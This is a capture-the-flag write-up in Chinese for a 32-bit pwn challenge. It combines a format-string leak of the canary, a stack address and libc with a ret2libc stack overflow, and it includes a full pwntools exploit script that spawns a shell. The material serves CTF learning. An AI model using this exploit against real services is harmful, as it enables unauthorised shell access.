# week2pwn4_x86

## 题目简述

这是 `pwn4` 的 32 位版本。格式化字符串可泄漏栈 Canary、栈地址和 libc 地址；随后在栈溢出中恢复 Canary 与栈帧数据，并按 i386 cdecl 调用约定构造 `system("/bin/sh")`。

## 解题过程

三个位置参数依次对应 Canary、当前栈指针线索和 libc 内返回地址。32 位 libc 泄漏减去偏移 `0x21519` 得到基址，再计算 `system` 与 `/bin/sh`：

~~~python
from pwn import *

context(os='linux', arch='i386', log_level='debug')
# io = process("./pwn")
io = remote("HOST", PORT)
libc = ELF("./libc.so.6")

payload = b'%39$p%40$p%43$p'
io.sendlineafter("What's your name?\n", payload)
canary = int(io.recv(10), 16)
success("canary:\t" + hex(canary))
stack_addr = int(io.recv(10), 16)
success("stack_addr:\t" + hex(stack_addr))
libc_base = int(io.recv(10), 16) - 0x21519
success("libc_base:\t" + hex(libc_base))
system_address = libc_base + libc.sym['system']
binsh_address = libc_base + next(libc.search(b'/bin/sh'))
payload = (
    b'a' * 0x80 + p32(canary) + p32(stack_addr - 0x10) + b'a' * 8 +
    p32(system_address) + b'a' * 4 + p32(binsh_address)
)
io.sendlineafter("Do you know how to getshell?\n", payload)
io.interactive()
~~~

在 32 位 cdecl 中，返回地址后的栈内容依次是被调函数返回地址和第一个参数，所以链尾布局为 `system | fake_ret | binsh`。`stack_addr - 0x10` 用来恢复该二进制预期的栈帧指针位置。

## 方法总结

- 核心方法：格式串泄漏三类运行时随机值，再保留 Canary 并用 32 位 cdecl 栈布局完成 ret2libc。
- 识别特征：i386 ELF、NX/Canary 开启，先有可控 `printf`，后有可覆盖返回地址的输入。
- 注意事项：不能套用 AMD64 的寄存器传参链；泄漏宽度、`p32` 打包和 libc 偏移都必须与 32 位环境匹配。
